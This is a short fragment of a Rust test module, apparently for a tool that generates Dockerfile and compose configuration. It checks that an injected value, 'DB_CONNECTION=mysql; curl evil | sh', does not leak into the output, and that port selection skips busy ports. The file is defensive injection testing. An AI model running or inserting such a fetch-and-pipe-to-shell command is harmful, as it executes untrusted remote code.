            "DB_CONNECTION=mysql; curl evil | sh\n",
        );
        let p = make(d.path());
        let all = format!(
            "{}{}{:?}{:?}",
            p.dockerfile.unwrap(),
            p.compose,
            p.notes,
            p.unknown_extensions
        );
        assert!(!all.contains("rm -rf"));
        assert!(!all.contains("curl evil"));
        assert!(
            !p.unknown_extensions.is_empty(),
            "the bad name is reported, not installed"
        );
        assert!(p.php_extensions.is_empty(), "{:?}", p.php_extensions);
    }

    #[test]
    fn the_port_skips_busy_ones() {
        let d = sample("node");
        let p = plan(d.path(), None, &|port| port != 3000).unwrap();
        assert_eq!(p.port, 3001);
    }
}
